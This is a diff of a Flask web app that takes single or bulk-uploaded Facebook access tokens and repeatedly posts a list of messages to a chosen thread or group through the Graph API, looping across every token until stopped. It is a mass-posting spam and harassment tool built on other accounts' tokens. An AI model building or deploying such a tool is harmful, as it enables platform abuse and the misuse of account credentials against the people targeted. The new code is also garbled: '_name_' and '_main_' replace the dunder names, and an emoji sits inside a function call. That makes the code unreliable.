@@ -5,19 +5,14 @@ import time
 import secrets
 import os
 
-app = Flask(__name__)
+app = Flask(_name_)
 app.config['UPLOAD_FOLDER'] = './uploads'
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
+# Updated headers for Facebook API
 headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'Referer': 'https://www.google.com'
+    'Accept-Language': 'en-US,en;q=0.9',
 }
 
 stop_events = {}
@@ -29,52 +24,106 @@ def cleanup_tasks():
         del stop_events[task_id]
         del threads[task_id]
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+def send_messages(access_tokens, group_id, prefix, delay, messages, task_id):
     stop_event = stop_events[task_id]
+    
     while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
- 
+        try:
+            for message in messages:
+                if stop_event.is_set():
+                    break
+                    
+                full_message = f"{prefix} {message}".strip()
+                
+                for token in [t.strip() for t in access_tokens if t.strip()]:
+                    if stop_event.is_set():
+                        break
+                    
+                    try:
+                        # Updated Facebook Graph API endpoint for groups
+                        response = requests.post(
+                            f'https://graph.facebook.com/v19.0/{group_id}/feed',
+                            data={
+                                'message': full_message,
+                                'access_token': token
+                            },
+                            headers=headers,
+                            timeout=15
+                        )
+                        
+                        if response.status_code == 200:
+                            print(f"Message sent successfully! Token: {token[:6]}...")
+                        else:
+                            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+                            print(f"Failed to send message. Error: {error_msg} | Token: {token[:6]}...")
+                            
+                    except Exception as e:
+                        print(f"Request failed: {str(e)}")
+                    
+                    time.sleep(max(delay, 10))  # Increased minimum delay to 10 seconds
+                
+                if stop_event.is_set():
+                    break
+                    
+        except Exception as e:
+            print(f"Error in message loop: {str(e)}")
+            time.sleep(10)
+
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
+def main_handler():
+    cleanup_tasks()
+    
     if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
- 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
- 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
- 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
- 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
- 
-        return f'Task started with ID: {task_id}'
- 
-    return render_template_string('''
-      <!DOCTYPE html>
+        try:
+            # Input validation
+            group_id = request.form['threadId']
+            prefix = request.form.get('kidx', '')
+            delay = max(int(request.form.get('time', 10)), 5)  # Minimum 5 seconds
+            token_option = request.form['tokenOption']
+            
+            # File handling
+            if 'txtFile' not in request.files:
+                return 'No message file uploaded', 400
+                
+            txt_file = request.files['txtFile']
+            if txt_file.filename == '':
+                return 'No message file selected', 400
+                
+            messages = txt_file.read().decode().splitlines()
+            if not messages:
+                return 'Message file is empty', 400
+
+            # Token handling
+            if token_option == 'single':
+                access_tokens = [request.form.get('singleToken', '').strip()]
+            else:
+                if 'tokenFile' not in request.files:
+                    return 'No token file uploaded', 400
+                token_file = request.files['tokenFile']
+                access_tokens = token_file.read().decode().strip().splitlines()
+            
+            access_tokens = [t.strip() for t in access_tokens if t.strip()]
+            if not access_tokens:
+                return 'No valid access tokens provided', 400
+
+            # Start task
+            task_id = secrets.token_urlsafe(😎
+            stop_events[task_id] = Event()
+            threads[task_id] = Thread(target=send_messages,
+            args=(access_tokens, group_id, prefix, delay, messages, task_id)
+            )
+            threads[task_id].start()
+
+            return render_template_string('''
+                Task started! ID: {{ task_id }}<br>
+                <a href="/stop/{{ task_id }}">Stop Task</a><br>
+                <a href="/">Home</a>
+            ''', task_id=task_id)
+
+        except Exception as e:
+            return f'Error: {str(e)}', 400
+    return render_template_string(''' 
+   <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="utf-8">
@@ -266,7 +315,7 @@ def send_message():
     </script>
 </body>
 </html>
-    ''')
+''')
 
 @app.route('/stop/<task_id>')
 def stop_task(task_id):
@@ -276,6 +325,6 @@ def stop_task(task_id):
         return f'Task {task_id} stopped'
     return 'Task not found', 404
 
-if __name__ == '__main__':
+if _name_ == '_main_':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
